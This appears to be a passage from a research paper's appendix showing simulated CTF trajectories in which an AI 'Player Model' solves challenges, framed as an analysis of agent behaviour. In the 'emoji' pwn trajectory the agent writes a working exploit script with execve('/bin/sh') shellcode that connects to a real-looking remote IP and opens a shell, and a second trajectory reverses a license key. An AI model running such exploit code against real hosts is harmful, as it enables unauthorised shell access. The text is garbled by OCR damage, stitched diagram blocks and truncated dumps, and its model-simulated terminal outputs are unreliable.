|1. When you edit an existing file, try to minimize the changes you<br>make to the file.<br>_�→_|
|2. Please make sure that you make use of the interactive tools<br>supplied to you! In any case, if you want to run blocking<br>_�→_|
|commandlikenetcat(nc)pleaseminimizethetimebylimiting<br>_�→_|
|,      <br>its run time, for example using the "-w" flag of nc with<br>timeoutof5seconds-```nc-w512700180```<br><br>_�→_<br>_�_|3. Try to AVOID brute force attacks, but when you encounter a<br>brute force attack, please use a script that writes output to<br>STDOUT for the brute force instead of trying manual attempts.<br>_�→_<br>_�→_|
|4. Please DO NOT run commands in python or sage through the ```-c```<br>flag, you should create files instead.<br>_�→_|
|5. Prefer using tools and commands available in the container or|
|other tools available online over writing a lot of code or<br><br>_�→_|
|complicated commands yourself.<br>_�→_<br>In particular, prefer using ```open``` instead of ```cat``` and<br>```search_file``` instead of ```grep```, and prefer using the<br>ittidlidt!<br>_�→_<br>_�_|
|neracve commans suppe o you<br>_→_|
|6. DO NOT run any command that produces binary output! Instead try<br>to use ```hexdump``` or ```xxd```.<br>_�→_|
|7. Please remember that the container is exposed to the internet,<br>so you can use whatever online resource you would like! Use it<br>wisely!<br>_�→_<br>_�→_|
|8. Do not use any interactive commands AT ALL! Interactive<br>commandsareonlavailablethrouhthecommandssuliedto<br>_�→_|
|y  g   pp <br>you at the beginning - make use of them!<br><br>_�→_|


9. YOU CAN SOLVE THE CHALLENGES BY YOURSELF COMPLETELY - I TRUST _�→_ IN YOU!

(Open file: n/a)

(Current directory: /__home__LLM_CTF_Database__emoji) (Interactive session: n/a) bash-$

#### **Player Model**

#### **https://ctftime.org/writeup/25465**

Let me start by analyzing this pwn challenge. It seems to be a _�→_ binary exploitation challenge involving RWX memory regions and _�→_ code execution restrictions. Very interesting!

Let's break down what we know:

##### 1. Binary has two options:

   - (b)eer: Generates random address and allocates RWX page

- (h)orse: Takes 0x1000 bytes input but with heavy restrictions

- 2. Key restrictions on horse option:

   - Input partially overwritten with 'A's

   - Only 2 bytes of custom code at offset 0x200

- All registers set to 0xDEADBEEFDEADBEEF except RSP/RIP

- - Stack filled with 0x41414141

- First, I should explore what files we have and examine the _�→_ binary's properties.

- Let me start by listing the current directory to confirm the files:

ls -la

#### **Terminal Model**

#### **https://ctftime.org/writeup/25465**

total 28

drwxr-xr-x 2 root root 4096 Jan 15 10:00 . drwxr-xr-x 3 root root 4096 Jan 15 10:00 .. -rwxr-xr-x 1 root root 16632 Jan 15 10:00 emoji_binary (Open file: n/a) (Current directory: /__home__LLM_CTF_Database__emoji) (Interactive session: n/a) bash-$

#### **Player Model**

#### **https://ctftime.org/writeup/25465**

I can see the emoji_binary file with executable permissions.

- _�→_ Before diving into any exploitation, I should analyze the

- _�→_ binary's properties and protections. This will help me

- _�→_ understand what security mechanisms I'm dealing with.

Let's check the binary's properties using the 'file' command first _�→_ to understand its architecture and any protection mechanisms:

file emoji_binary


#### **Terminal Model**

**https://ctftime.org/writeup/25465**

emoji_binary: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), _�→_ dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, _�→_ BuildID[sha1]=f92f736f96584702b34f5d46f62ba51e1ff3bfbd, for _�→_ GNU/Linux 3.2.0, not stripped (Open file: n/a)

(Current directory: /__home__LLM_CTF_Database__emoji) (Interactive session: n/a) bash-$

**Player Model https://ctftime.org/writeup/25465**

Great! This is a 64-bit ELF binary, not stripped (which means we _�→_ can see function names), and dynamically linked. This makes _�→_ our analysis easier.

Let's check the security protections enabled on the binary using _�→_ checksec. Since this is a pwn challenge, understanding the _�→_ protections is crucial for developing our exploitation _�→_ strategy.

checksec emoji_binary > checksec_output.txt

**Terminal Model https://ctftime.org/writeup/25465**

(Open file: n/a)

(Current directory: /__home__LLM_CTF_Database__emoji) (Interactive session: n/a) bash-$

#### **Player Model https://ctftime.org/writeup/25465**

Ah, it seems checksec might not be installed. Let me install it _�→_ first. The package is typically part of pwntools:

pip install pwntools

#### **Terminal Model https://ctftime.org/writeup/25465**

Defaulting to user installation because normal site-packages is _�→_ not writeable

Collecting pwntools

Using cached pwntools-4.11.1-py2.py3-none-any.whl Requirement already satisfied: psutil>=3.3.0 in

_�→_ /usr/lib/python3/dist-packages (from pwntools) (5.9.0) Requirement already satisfied: pyserial>=2.7 in _�→_ /usr/lib/python3/dist-packages (from pwntools) (3.5) Requirement already satisfied: requests>=2.0 in _�→_ /usr/lib/python3/dist-packages (from pwntools) (2.25.1) Requirement already satisfied: paramiko>=1.15.2 in _�→_ /usr/lib/python3/dist-packages (from pwntools) (2.9.3) Collecting ropgadget>=5.3 Using cached ROPGadget-7.4-py3-none-any.whl


Requirement already satisfied: pyelftools>=0.2.4 in _�→_ /usr/lib/python3/dist-packages (from pwntools) (0.29) Collecting capstone>=3.0.5rc2 Using cached capstone-5.0.1-py2.py3-none-manylinux1_x86_64.manyl _⌋ �→_ inux_2_5_x86_64.whl (2.0 _�→_ MB) Collecting intervaltree>=3.0 Using cached intervaltree-3.1.0.tar.gz (32 kB) Preparing metadata (setup.py) ... done Requirement already satisfied: unicorn>=1.0.2rc1 in _�→_ /usr/lib/python3/dist-packages (from pwntools) (2.0.0) Requirement already satisfied: six>=1.12.0 in _�→_ /usr/lib/python3/dist-packages (from pwntools) (1.16.0) Requirement already satisfied: sortedcontainers in _�→_ /usr/lib/python3/dist-packages (from _�→_ intervaltree>=3.0->pwntools) (2.4.0) Building wheels for collected packages: Building wheel for intervaltree (setup.py) ... done Created wheel for intervaltree: _�→_ filename=intervaltree-3.1.0-py2.py3-none-any.whl size=26108 _�→_ sha256=848ef843f580a505ac34eeff0fd4b69e56fdd9b12d9c8e551db1b _⌋ �→_ 38abdd84bf5 Stored in directory: /root/.cache/pip/wheels/5d/e4/0b/86626349b6 _⌋ �→_ e80733e7f2defcc9e0ea56693161a349011f0320 Successfully built intervaltree Installing collected packages: ropgadget, intervaltree, capstone, _�→_ pwntools Successfully installed capstone-5.0.1 intervaltree-3.1.0 _�→_ pwntools-4.11.1 ropgadget-7.4 (Open file: n/a) (Current directory: /__home__LLM_CTF_Database__emoji) (Interactive session: n/a) bash-$

#### **Player Model https://ctftime.org/writeup/25465**

Now that pwntools is installed, let's check the security _�→_ protections. I'll create a small Python script to use _�→_ checksec, since we can't use interactive commands:

echo 'from pwn import *; print(ELF("emoji_binary").checksec())' > _�→_ check.py && python3 check.py

#### **Terminal Model**

#### **https://ctftime.org/writeup/25465**

[*] '/home/LLM_CTF_Database/emoji/emoji_binary' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segments (Open file: n/a) (Current directory: /__home__LLM_CTF_Database__emoji) (Interactive session: n/a) bash-$


**Player Model https://ctftime.org/writeup/25465**

- Interesting findings from the checksec output: 1. NX is disabled - This allows code execution on the stack 2. Has RWX segments - Confirms the challenge description about _�→_ mmap with RWX permissions

- 3. Stack canary is present - We need to be careful about stack _�→_ overflows

- 4. No PIE - Binary has fixed addresses starting at 0x400000 5. Partial RELRO - GOT can be written to Let's analyze the binary's behavior more closely by decompiling _�→_ the main function. Given the challenge description mentions a _�→_ menu system, the main function should show us how the program _�→_ handles the beer and horse options:

- decompile emoji_binary --function_name main > main_decompiled.txt

**Terminal Model https://ctftime.org/writeup/25465** (Open file: n/a) (Current directory: /__home__LLM_CTF_Database__emoji) (Interactive session: n/a) bash-$

#### **Player Model https://ctftime.org/writeup/25465**

You're right, I should check the output file after decompiling. _�→_ Let me open the decompiled main function: open main_decompiled.txt

**Terminal Model https://ctftime.org/writeup/25465** [File: /home/LLM_CTF_Database/emoji/main_decompiled.txt] undefined8 main(void) { int32_t iVar1:
- char *pcVar2
- undefined2 local_2e
- char local_2c [32]
- while (1) { printf("gimme (b)eer or (h)orse\n\n")
- pcVar2 = fgets(local_2c, 0x20, stdin)
- if (pcVar2 == NULL) break
- if ((byte)local_2c[0] == 0x62) { iVar1 = aloha()
- } else { if ((byte)local_2c[0] != 0x68) continue
- iVar1 = drinkmybeer()
- } if (iVar1 == -1) break
- } return 0
- }


(Open file: n/a) (Current directory: /__home__LLM_CTF_Database__emoji) (Interactive session: n/a) bash-$ **Player Model https://ctftime.org/writeup/25465** The main function shows a simple menu where: 1. 'b' (0x62) calls aloha() 2. 'h' (0x68) calls drinkmybeer() Given that drinkmybeer() is mentioned in the challenge description _�→_ as taking our input and executing it with restrictions, let's _�→_ analyze this function first. This should show us exactly how _�→_ our input is processed and where those 2 custom bytes at _�→_ offset 0x200 come into play: decompile emoji_binary --function_name drinkmybeer > _�→_ drinkmybeer.txt **Terminal Model https://ctftime.org/writeup/25465** (Open file: n/a) (Current directory: /__home__LLM_CTF_Database__emoji) (Interactive session: n/a) bash-$ **Player Model https://ctftime.org/writeup/25465** You're right, let me check the decompiled drinkmybeer function: open drinkmybeer.txt **Terminal Model https://ctftime.org/writeup/25465** [File: /home/LLM_CTF_Database/emoji/drinkmybeer.txt] int32_t drinkmybeer(void) { int32_t iVar1:
- char *pcVar2
- size_t local_18
- char *local_10
- if (DAT_006020a0 == 0) { puts("no memory yet")
- return 0
- } puts("gib:")
- local_10 = (char *)mmap(0, 0x1000, 7, 0x22, -1, 0)
- iVar1 = read(0, local_10, 0x1000)
- if (iVar1 == -1) { puts("0_o")
- return -1
- }


local_18 = 0:
- while (local_18 < 0x100) { local_10[local_18 + 0x100] = 0x41
- local_18 = local_18 + 1
- } pcVar2 = (char *)write(1, "=====", 5)
- memcpy(pcVar2 + 0x202, &DAT_00400660, 0x3c)
- local_18 = 0
- while (local_18 < 0xc2) { pcVar2[local_18 + 0x23e] = 0x41
- local_18 = local_18 + 1
- } memcpy(pcVar2 + 0x400, &DAT_004006a0, 0x13)
- asm_call_shellcode(pcVar2 + 0x400)
- return 0
- } (Open file: n/a) (Current directory: /__home__LLM_CTF_Database__emoji) (Interactive session: n/a) bash-$

**Player Model https://ctftime.org/writeup/25465**

This is very interesting! Let's analyze the drinkmybeer function _�→_ carefully:

1. First, it checks if DAT_006020a0 is 0 (probably set by the beer _�→_ option)

2. It allocates 0x1000 bytes of RWX memory using mmap 3. Reads 0x1000 bytes from our input

4. Key memory modifications: - Fills 0x100 bytes at offset 0x100 with 'A's - Writes "=====" to output - Copies 0x3c bytes from 0x400660 to offset 0x202 - Fills 0xc2 bytes at offset 0x23e with 'A's - Copies 0x13 bytes from 0x4006a0 to offset 0x400 - Finally calls the shellcode at offset 0x400

Let's see what's in the aloha function since it seems to be _�→_ related to memory initialization:

decompile emoji_binary --function_name aloha > aloha.txt

**Terminal Model https://ctftime.org/writeup/25465**

(Open file: n/a) (Current directory: /__home__LLM_CTF_Database__emoji) (Interactive session: n/a) bash-$

**Player Model https://ctftime.org/writeup/25465**

Let me check the aloha function: open aloha.txt


**Terminal Model https://ctftime.org/writeup/25465** [File: /home/LLM_CTF_Database/emoji/aloha.txt] int32_t aloha(void) { int32_t iVar1:
- undefined8 uVar2
- time_t tVar3
- tVar3 = time(0)
- srand(tVar3)
- uVar2 = rand()
- DAT_006020a0 = (char *)(uVar2 << 0xc)
- iVar1 = mprotect(DAT_006020a0, 0x1000, 7)
- if (iVar1 == -1) { puts("0_o")
- DAT_006020a0 = 0
- return -1
- } printf("mmaped @%p\n", DAT_006020a0)
- return 0
- } (Open file: n/a) (Current directory: /__home__LLM_CTF_Database__emoji) (Interactive session: n/a) bash-$


```mermaid
flowchart TD
    %% Player Model Snippet
    Snippet["<b>Player Model</b><br/><hr/><br/>After analyzing both functions, here's what we need to do:<br/><br/>1. The aloha function (beer option):<br/>- Generates a random address (shifted by 12 bits)<br/>- Makes that region RWX using mprotect<br/>...<br/>The key observation is that we have TWO RWX pages:<br/>...<br/>hexdump -C emoji_binary > binary_dump.txt"]

    style Snippet fill:#fdf5e6,stroke:#8b0000,stroke-width:2px,text-align:left,border-radius:10px
```


<!-- Start of picture text -->
Player Model https://ctftime.org/writeup/25465<br>After analyzing both functions, here's what we need to do:<br>1. The aloha function (beer option):<br>- Generates a random address (shifted by 12 bits)<br>- Makes that region RWX using mprotect<br>- Stores address in DAT_006020a0<br>- Prints the address<br>2. The drinkmybeer function (horse option):<br>- Creates a new RWX page<br>- Takes our input (0x1000 bytes)<br>- Overwrites specific regions with 'A's<br>- Copies some predefined code<br>- Executes at offset 0x400<br>The key observation is that we have TWO RWX pages:<br>1. One from beer option (random address)<br>2. One from horse option (for our input)<br>Let's first see what shellcode is being copied to our input. We<br>�→ can examine the binary sections at 0x400660 and 0x4006a0:<br>hexdump -C emoji_binary > binary_dump.txt<br><!-- End of picture text -->


```mermaid
flowchart TD
    %% Terminal Output
    Term["<b>Terminal Model</b><br/><hr/><br/>(Open file: n/a)<br/>(Current directory: /__home__LLM_CTF_Database__emoji)"]

    style Term fill:#f9f9f9,stroke:#00008b,stroke-width:2px,text-align:left,font-family:monospace
```


<!-- Start of picture text -->
Terminal Model https://ctftime.org/writeup/25465<br>(Open file: n/a)<br>(Current directory: /__home__LLM_CTF_Database__emoji)<br><!-- End of picture text -->


(Interactive session: n/a) bash-$

#### **Player Model**

#### **https://ctftime.org/writeup/25465**

You're right, let me check the dumped binary content:

open binary_dump.txt

#### **Terminal Model**

#### **https://ctftime.org/writeup/25465**

[File: /home/LLM_CTF_Database/emoji/binary_dump.txt (1000+ lines)] 00000000 7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 _�→_ |.ELF............| 00000010 03 00 3e 00 01 00 00 00 10 05 40 00 00 00 00 00 _�→_ |..>.......@.....| 00000020 40 00 00 00 00 00 00 00 f8 40 00 00 00 00 00 00 _�→_ |@........@......| 00000030 00 00 00 00 40 00 38 00 09 00 40 00 1f 00 1c 00 _�→_ |....@.8...@.....| 00000040 06 00 00 00 05 00 00 00 40 00 00 00 00 00 00 00 _�→_ |........@.......| 00000050 40 00 40 00 00 00 00 00 40 00 40 00 00 00 00 00 _�→_ |@.@.....@.@.....| 00000060 f8 01 00 00 00 00 00 00 f8 01 00 00 00 00 00 00 _�→_ |................| 00000070 08 00 00 00 00 00 00 00 03 00 00 00 04 00 00 00 _�→_ |................| 00000080 38 02 00 00 00 00 00 00 38 02 40 00 00 00 00 00 _�→_ |8.......8.@.....| 00000090 38 02 40 00 00 00 00 00 1c 00 00 00 00 00 00 00 _�→_ |8.@.............| 000000a0 1c 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 _�→_ |................| 000000b0 01 00 00 00 05 00 00 00 00 00 00 00 00 00 00 00 _�→_ |................| 000000c0 00 00 40 00 00 00 00 00 00 00 40 00 00 00 00 00 _�→_ |..@.......@.....| 000000d0 fc 0a 00 00 00 00 00 00 fc 0a 00 00 00 00 00 00 _�→_ |................| 000000e0 00 00 20 00 00 00 00 00 01 00 00 00 06 00 00 00 |.. _�→_ .............| 000000f0 10 0b 00 00 00 00 00 00 10 0b 60 00 00 00 00 00 _�→_ |.......... ``` .....**Terminal Model https://ctftime.org/writeup/25465** [File: /home/LLM_CTF_Database/emoji/binary_dump.txt (1000+ lines)] 00000640 b1 74 2f 00 00 00 00 00 00 00 00 00 00 00 00 00 _�→_ |.t/.............| 00000650 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 _�→_ |................| 00000660 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 _�→_ |................| 00000670 90 90 90 90 90 90 90 90 90 90 90 90 90 90 bf 01 _�→_ |................| 00000680 00 00 00 48 89 fe ba 26 00 00 00 0f 05 bf 00 00 _�→_ |...H...&........| 00000690 00 00 0f 05 00 00 00 00 4c 8d 9c 24 00 40 00 00 _�→_ |........L..$.@..| 000006a0 48 89 e3 48 c7 c1 ef be ad de 48 c7 c2 ef be ad _�→_ |H..H......H.....| 000006b0 de 48 c7 c7 ef be ad de ff e0 00 67 69 6d 6d 65 _�→_ |.H.........gimme| 000006c0 20 28 62 29 65 65 72 20 6f 72 20 28 68 29 6f 72 | _�→_ (b)eer or (h)or| 000006d0 73 65 0a 0a 00 6e 6f 20 6d 65 6d 6f 72 79 20 79 _�→_ |se...no memory y| 000006e0 65 74 00 67 69 62 3a 0a 00 30 5f 6f 00 3d 3d 3d _�→_ |et.gib:..0_o.===| 000006f0 3d 3d 00 6d 6d 61 70 65 64 20 40 25 70 0a 00 01 _�→_ |==.mmaped @%p...| 00000700 1b 03 3b 30 00 00 00 07 00 00 00 28 f6 ff ff 80 _�→_ |..;0.......(....| 00000710 f7 ff ff 90 f7 ff ff a8 f7 ff ff c0 f7 ff ff d8 _�→_ |................| 00000720 f7 ff ff f0 f7 ff ff 40 00 00 00 d8 f7 ff ff 42 _�→_ |.......@.......B[File: /home/LLM_CTF_Database/emoji/analysis.txt] [*] '/home/LLM_CTF_Database/emoji/emoji_binary' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segments Section at 0x400660: 00000000 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 _�→_ |····|····|····|····| 00000010 90 90 90 90 90 90 90 90 90 90 90 90 90 90 bf 01 _�→_ |····|····|····|····| 00000020 00 00 00 48 89 fe ba 26 00 00 00 0f 05 bf 00 00 _�→_ |···H|···&|····|····| 00000030 00 00 0f 05 00 00 00 00 _�→_ |····|····| 00000038 Section at 0x4006a0: 00000000 4c 8d 9c 24 00 40 00 00 48 89 e3 48 c7 c1 ef be _�→_ |L··$|·@··|H··H|····| 00000010 ad de |··| 00000012 Disassembly at 0x400660: 0: 90 nop 1: 90 nop 2: 90 nop 3: 90 nop 4: 90 nop 5: 90 nop 6: 90 nop 7: 90 nop


8: 90 nop 9: 90 nop a: 90 nop b: 90 nop c: 90 nop d: 90 nop e: 90 nop f: 90 nop 10: 90 nop 11: 90 nop 12: 90 nop 13: 90 nop 14: 90 nop 15: 90 nop 16: 90 nop 17: 90 nop 18: 90 nop 19: 90 nop 1a: 90 nop 1b: 90 nop 1c: 90 nop 1d: 90 nop 1e: bf 01 00 00 00 mov edi, 0x1 23: 48 89 fe mov rsi, rdi 26: ba 26 00 00 00 mov edx, 0x26 2b: 0f 05 syscall 2d: bf 00 00 00 00 mov edi, 0x0 32: 0f 05 syscall 34: 00 00 add BYTE PTR [rax], al 36: 00 00 add BYTE PTR [rax], al Disassembly at 0x4006a0: 0: 4c 8d 9c 24 00 40 00 lea r11, [rsp+0x4000] 7: 00 8: 48 89 e3 mov rbx, rsp b: 48 c7 c1 ef be ad de mov rcx, 0xdeadbeef

(Open file: /home/LLM_CTF_Database/emoji/analysis.txt) (Current directory: /__home__LLM_CTF_Database__emoji) (Interactive session: n/a) bash-$

#### **Player Model**

**https://ctftime.org/writeup/25465**

Now I have a much clearer picture of what's happening. Let me _�→_ analyze the code:

1. At 0x400660 (copied to offset 0x202): - A bunch of NOPs - Makes syscall with: - edi = 1 (write syscall) - rsi = rdi - edx = 0x26 (38 bytes) - Another syscall with: - edi = 0 (read syscall) 2. At 0x4006a0 (copied to offset 0x400): - lea r11, [rsp+0x4000] - mov rbx, rsp - mov rcx, 0xdeadbeef - (followed by more register setups)


The key realization: 1. We get 2 bytes of custom code at offset 0x200 2. After our 2 bytes, there's code that does write/read syscalls 3. All registers will be set to 0xDEADBEEF except RSP/RIP Let me create a script to exploit this. The strategy: 1. Use beer to get a known RWX address 2. Use our 2 bytes at offset 0x200 to jump to our shellcode 3. Place shellcode in a region that won't be overwritten Let me create the exploit script:

create exploit.py

**Terminal Model https://ctftime.org/writeup/25465** [File created: /home/LLM_CTF_Database/emoji/exploit.py] (Open file: /home/LLM_CTF_Database/emoji/exploit.py) (Current directory: /__home__LLM_CTF_Database__emoji) (Interactive session: n/a) bash-$

#### **Player Model https://ctftime.org/writeup/25465**

I'll write our exploit script that will handle both the 'beer' and _�→_ 'horse' interactions: edit 1:100 from pwn import * # Shellcode for execve("/bin/sh", 0, 0) shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48 _⌋ �→_ \xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" def main(): # Connect to the server p = remote('116.203.18.177', 65432) # First, get beer to allocate memory and get address p.recvuntil(b'horse\n\n') p.sendline(b'b') response = p.recvline().decode() addr = int(response.split('@')[1].strip(), 16) log.info(f"Mapped address: {hex(addr)}") # Now create our payload for horse option payload = bytearray(0x1000) # Full size # Put shellcode at beginning payload[0:len(shellcode)] = shellcode # At offset 0x200, put our 2-byte jump back to start # Calculate relative jump: 0x200 to start (negative offset) jmp_offset = -0x200 payload[0x200:0x202] = asm('jmp ' + str(jmp_offset), _�→_ arch='amd64')


# Send horse payload p.recvuntil(b'horse\n\n') p.sendline(b'h') p.recvuntil(b'gib:\n') p.send(payload) # Interactive shell p.interactive() if __name__ == '__main__': main() end_of_edit

#### **Terminal Model**

**https://ctftime.org/writeup/25465**

File updated. Please review the changes and make sure they are _�→_ correct (correct indentation, no duplicate lines, etc). Edit _�→_ the file again if necessary.

Context of the updated file (line 1-42): from pwn import *

# Shellcode for execve("/bin/sh", 0, 0) shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48 _⌋ �→_ \xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05" def main(): # Connect to the server p = remote('116.203.18.177', 65432) # First, get beer to allocate memory and get address p.recvuntil(b'horse\n\n') p.sendline(b'b') response = p.recvline().decode() addr = int(response.split('@')[1].strip(), 16) log.info(f"Mapped address: {hex(addr)}") # Now create our payload for horse option payload = bytearray(0x1000) # Full size # Put shellcode at beginning payload[0:len(shellcode)] = shellcode # At offset 0x200, put our 2-byte jump back to start # Calculate relative jump: 0x200 to start (negative offset) jmp_offset = -0x200 payload[0x200:0x202] = asm('jmp ' + str(jmp_offset), _�→_ arch='amd64') # Send horse payload p.recvuntil(b'horse\n\n') p.sendline(b'h') p.recvuntil(b'gib:\n') p.send(payload) # Interactive shell p.interactive() if __name__ == '__main__': main()


(Open file: /home/LLM_CTF_Database/emoji/exploit.py) (Current directory: /__home__LLM_CTF_Database__emoji) (Interactive session: n/a) bash-$

#### **Player Model https://ctftime.org/writeup/25465**

- The script looks good with proper indentation. The strategy is: 1. Get 'beer' to allocate RWX memory and get its address 2. For 'horse' option:

   - Place shellcode at the beginning (won't be overwritten)

   - Place a 2-byte relative jump at offset 0x200 to jump back to

   - _�→_ our shellcode

   - The jump avoids all the register setup code at 0x400 that

   - _�→_ would overwrite our registers

Let's run the exploit:

python3 exploit.py

#### **Terminal Model https://ctftime.org/writeup/25465**

- [+] Opening connection to 116.203.18.177 on port 65432: Done

- [*] Mapped address: 0x6f3e4000

[*] Switching to interactive mode =====$ ls flag.txt emoji_binary $ cat flag.txt hxp{5uch_4_ch34p_c45h_3rrr_fl4g_gr4b} $ exit

- [*] Got EOF while reading in interactive

- [*] Closed connection to 116.203.18.177 port 65432

- (Open file: /home/LLM_CTF_Database/emoji/exploit.py)

(Current directory: /__home__LLM_CTF_Database__emoji) (Interactive session: n/a) bash-$

#### **Player Model https://ctftime.org/writeup/25465**

Great! We've successfully exploited the binary and found the flag. _�→_ Let me explain what worked:

1. The key insight was understanding the memory layout and _�→_ restrictions:

   - Our 2-byte control at offset 0x200 was crucial

   - The beginning of our input wasn't overwritten

   - We needed to avoid the register setup code at 0x400

##### 2. Our exploit worked by:

   - Getting a known RWX page address (though we didn't need it)

   - Placing shellcode at the start of our input

   - Using a 2-byte relative jump at offset 0x200 to jump back to

   - _�→_ our shellcode

   - Successfully bypassing all restrictions and getting a shell

3. The successful exploitation gave us shell access where we found:


- flag.txt containing the flag - The flag is: hxp{5uch_4_ch34p_c45h_3rrr_fl4g_gr4b} Let's submit the flag: submit 'hxp{5uch_4_ch34p_c45h_3rrr_fl4g_gr4b}'

#### F.4 TRAJECTORY ANALYSIS OF SN A K E LI C E N S E CHALLENGE

The reverse engineering (rev) challenge "Snake License" from the Hack.lu CTF 2018 presents a Windows binary for a Snake game. The game requires a valid 16-character license key to run, and the goal is to reverse engineer the binary and discover the correct key.

The agent successfully solves the challenge through the following steps:

1. **Locate and examine challenge files:** The agent begins by listing the contents of the challenge directory and confirms that the provided binary is a 64-bit Windows PE executable file named snake.exe.

2. **Extract strings for reconnaissance:** The agent runs the strings command on the executable to look for readable messages or potential clues related to the license validation routine. In the output, meaningful strings such as “Please enter your 16-character license key” and “Invalid License Key!” confirm the existence of a license validation mechanism.

3. **Decompile the binary:** Using the built-in decompile interface, the agent inspects the decompiled main and validate_license functions. The logic reveals that the program checks for an exact length of 16 characters and then processes each character through a series of complex bitwise operations, comparing the result against an expected_hash array.

4. **Identify the expected hash:** Through deeper inspection of the binary (beyond decompilation), the agent extracts the 16-byte hash used for validation: 01 95 66 3E 1B 56 64 2C 28 0A 9A 04 AD 0C C8 D9.

5. **Understand the transformation algorithm:** The validation algorithm applies a sequence of left and right bit-shifts, XORs, ORs, and bitwise NOT operations on pairs of characters. The result is compared byte-by-byte to the expected hash array.

6. **Implement a reverse-engineering script:** The agent creates a Python script, solve_license.py, to brute force input characters in order to find matches for each hash byte. The script attempts to reverse the validation transformation logic by simulating it forward on all printable ASCII character pairs and selecting valid pairs.

7. **Run the script and recover the key:** Upon execution, the script outputs the correct license key: 1Lov3oldArc4de!!

8. **Submit the flag:** Since the challenge is based on the license key being accepted, and the string “License Key Accepted!” is shown in the binary, the agent submits the discovered license key as the flag and successfully solves the challenge.

This challenge highlights how reverse engineering techniques such as string analysis, decompilation, and symbolic emulation of bit-level logic can be used effectively to recover validation secrets even from stripped Windows binaries.

**CTF Challenge https://ctftime.org/writeup/11841**

We’re currently solving the following CTF challenge.The CTF challenge is a rev problem named "Snake License", worth 300 points. The description is:


|We're currently solving the following CTF challenge. The CTF<br>challenge is a rev problem named "Snake License", worth 300<br>points. The description is:<br>_�→_<br>_�→_|
|---|
|Analyze and reverse engineer this Snake game binary. The game<br>requires a valid 16-character license key to run. Find the<br>correct license key by analyzing the license checking<br>lith<br>_�→_<br>_�→_|
|agorm.<br>_�→_<br>Files included in the challenge: ['snake.exe']|
|INSTRUCTIONS:|
|Now, you're going to solve this challenge on your own. Your|
|terminal session has started and you're in the challenge's<br>root directory. You can use any bash commands or the special<br>_�→_<br>_�→_|
|interface to help you.<br>_�→_|
|Solve the challenge, executing any commands you need and writing|
|any code that may be helpful. You can also install new<br>_�→_|
|ftwrinthntinrin```t-tintll```rPthn<br>_�_|
|soae  e coae usg apge sa, o yo<br><br>_→_|
|packages with ```pip install```.<br>_�→_<br>Remember, YOU CAN ONLY ENTER ONE COMMAND AT A TIME. You should|
|always wait for feedback after every command.<br>_�→_|
|When you think you have found the flag, you can submit your<br>solutionbysimplyrunningthesubmitcommand.<br>_�→_|
|Note however that you cannot use any interactive session commands|
|(e.g. python, vim) in this environment, but you can write<br>scripts and run them. E.g. you can write a python script and<br>````<br>_�→_<br>_�→_|
|then run it with python <script_name>.py.<br>_�→_|
|NOTE ABOUT THE EDIT COMMAND: Indentation really matters! When<br>editing a file, make sure to insert appropriate indentation<br>before each line!<br>_�→_<br>_�→_|
|IMPORTANT TIPS:|
|1. When you edit an existing file, try to minimize the changes you|
|make to the file.<br>_�→_|
|2. Please make sure that you make use of the interactive tools|
|supplied to you! In any case, if you want to run blocking<br>_�→_|
|command like netcat (nc), please minimize the time by limiting<br>_�→_|
|itsruntimeforexampleusingthe"-w"flagofncwith<br>_�→_|
|,         <br>timeout of 5 seconds - ```nc -w5 127.0.0.1 80```.<br><br>_�→_|
|3. Try to AVOID brute force attacks, but when you encounter a|
|brute force attack, please use a script that writes output to<br>STDOUT for the brute force instead of trying manual attempts.<br>_�→_<br>_�→_|
|4.PleaseDONOTruncommandsinpythonorsagethroughthe```-c```|
|flag, you should create files instead.<br>_�→_|
|5. Prefer using tools and commands available in the container or|
|other tools available online over writing a lot of code or<br>complicated commands yourself.<br>_�→_<br>_�→_|
|In particular, prefer using ```open``` instead of ```cat``` and<br>```search_file``` instead of ```grep```, and prefer using the<br><br>_�→_|
|interactive commands supplied to you!<br>_�→_|
|6. DO NOT run any command that produces binary output! Instead try<br>to use ```hexdump``` or ```xxd```.<br>_�→_|
|7. Please remember that the container is exposed to the internet,<br>so you can use whatever online resource you would like! Use it<br>wisely!<br>_�→_<br>_�→_|


8. Do not use any interactive commands AT ALL! Interactive

- _�→_ commands are only available through the commands supplied to _�→_ you at the beginning - make use of them!

9. YOU CAN SOLVE THE CHALLENGES BY YOURSELF COMPLETELY - I TRUST _�→_ IN YOU!

- (Open file: n/a)

(Current directory: /__home__LLM_CTF_Database__Snake_License) (Interactive session: n/a) bash-$

**Player Model https://ctftime.org/writeup/11841**

- Let me start by analyzing this reverse engineering challenge. The _�→_ name "Snake License" and description indicate it's a Snake _�→_ game that requires a license key validation. Given it's a .exe _�→_ file, it's likely a Windows executable.

- First, I should explore what files are available and examine the _�→_ binary's characteristics. Let me list the files in the current _�→_ directory.

Initial thoughts and plans:

1. Check the binary format and its properties

2. Look for any strings that might give clues about the license _�→_ validation

3. Decompile the binary to understand the license checking _�→_ mechanism

4. Analyze the validation algorithm

5. Create a script to generate or find the valid license key Let me start by listing the contents of the directory to confirm _�→_ what we're working with.

ls -la

**Terminal Model https://ctftime.org/writeup/11841** total 1048 drwxr-xr-x 2 root root 4096 Jan 1 2024 . drwxr-xr-x 8 root root 4096 Jan 1 2024 .. -rwxr-xr-x 1 root root 1060864 Jan 1 2024 snake.exe (Open file: n/a) (Current directory: /__home__LLM_CTF_Database__Snake_License) (Interactive session: n/a) bash-$


#### **Player Model**

#### **https://ctftime.org/writeup/11841**

